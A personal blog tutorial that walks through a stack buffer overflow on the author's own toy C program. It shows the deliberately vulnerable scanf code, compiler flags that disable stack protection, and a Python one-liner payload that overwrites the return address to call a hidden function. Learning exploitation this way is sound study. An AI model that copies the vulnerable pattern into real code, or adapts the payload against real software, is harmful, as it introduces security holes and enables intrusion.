---
layout: post
title: "Buffer Overflow"
date: 2022-02-16 17:00:00 +01:00
tags: edb security
---

I remember I've tried hard when I was younger to create a super easy example of a buffer overflow.
I read about it and understood the mechanism, but never accomplished writing a real program which demonstrates the effect.

That thought crossed my mind today and I realized I should be able to do it today with a little more experience.

In addition, I found this wonderful article about it:  
[dhavalkapil.com](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/)

So, I will basically repeat the steps in the article and build my first own buffer overflow program.

# The program

*buffer-overflow.c*

```c
#include <stdio.h>

void secretFunction()
{
    printf("Congratulations!\n");
    printf("You have entered in the secret function!\n");
}

void echo()
{
    char buffer[20];

    printf("Enter some text:\n");
    scanf("%s", buffer);
    printf("You entered: %s\n", buffer);    
}

int main()
{
    echo();

    return 0;
}
```

As you can see, the buffer size remains unchecked and a user can enter more than the expected 20 characters.
This leads to write into parts of the memory the program is not supposed to write.

We will overwrite the RETURN address of the function, which is stored in the stack, in order to execute the secretFunction().

# Compilation

We need to set special compiler flags to disable any security checks.
It is great the compilers today have that built-in checks, but disabling them makes it easier to grasp the concepts
and maybe understand why those checks have been added over time.

```
gcc -m32 -fno-stack-protector -no-pie buffer-overflow.c -o buffer-overflow
```

# Running and crashing the program

This works fine:

```
$ ./buffer-overflow 
Enter some text:
Test
You entered: Test
```

A text more than 20 characters crashes the program, as expected:

```
$ ./buffer-overflow
Enter some text:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You entered: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
fish: Job 1, './buffer-overflow' terminated by signal SIGSEGV (Adressbereichsfehler)
```

Note: It still manages to output the text, before crashing.

# Evan's Debugger

I used to play hundreds of hours with OllyDbg, a debugger for Windows.

During my research and having `gdb` in mind I thought there might be something similar to OllyDbg for Linux.
And indeed there is: [https://github.com/eteran/edb-debugger](https://github.com/eteran/edb-debugger)

I've installed it from [here](https://aur.archlinux.org/packages/edb-debugger), but I needed to change
the plugin directory manually after the installation (Preferences -> Directories -> Plugin Directory: `/usr/lib/edb`).

![]({{ site.baseurl }}/images/2022-02-16-buffer-overflow/edb.png)

# Finding the right address

We don't just want to crash our program, we want to execute the secretFunction().
In order to do that, we need to know it's address.

We can either do it in edb (CTRL+ALT+S):

![]({{ site.baseurl }}/images/2022-02-16-buffer-overflow/edb-symbols.png)

or via gdb:

```
$ gdb -batch -ex "info functions" -ex quit ./buffer-overflow
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049040  printf@plt
0x08049050  puts@plt
0x08049060  __libc_start_main@plt
0x08049070  __isoc99_scanf@plt
0x08049080  _start
0x080490c0  _dl_relocate_static_pie
0x080490d0  __x86.get_pc_thunk.bx
0x080490e0  deregister_tm_clones
0x08049120  register_tm_clones
0x08049160  __do_global_dtors_aux
0x08049190  frame_dummy
0x08049196  secretFunction
0x080491d2  echo
0x08049228  main
0x08049244  __x86.get_pc_thunk.ax
0x08049250  __libc_csu_init
0x080492c0  __libc_csu_fini
0x080492c5  __x86.get_pc_thunk.bp
0x080492cc  _fini
```

# The payload

Now, we need to know where exactly to put the address in our input text.
See the screenshot for details:
Our variable `buffer` starts at `ffae:7e7c` in this case.
The return address to the main function is stored at `ffae:7e9c`.

If we manage to write the address of our secret function (`0x08049196`) into that, our secret function will be called, instead of returning to the main function.

`0x7e9c - 0x7e7c = 0x20`, which is 32 in decimal.
We need to write 32 bytes (any bytes) followed by 0x08049196 into the `buffer` variable, and we should reach our goal:
(See [here](https://stackoverflow.com/questions/66258454/printing-non-ascii-characters-in-python3) why we can't use print())

```
$ python -c 'import sys; sys.stdout.buffer.write(b"a"*32 + b"\x96\x91\x04\x08")' | ./buffer-overflow 
Enter some text:
You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��
Congratulations!
You have entered in the secret function!
fish: Process 17504, './buffer-overflow' from job 1, 'python -c 'import sys; sys.stdo…' terminated by signal SIGSEGV (Adressbereichsfehler)
```

Voilà. Now, the program still crashes, but our secret function was called before!

Next challenge could be to build a payload which contains and executes own code,
instead of executing code which already exists in the binary.
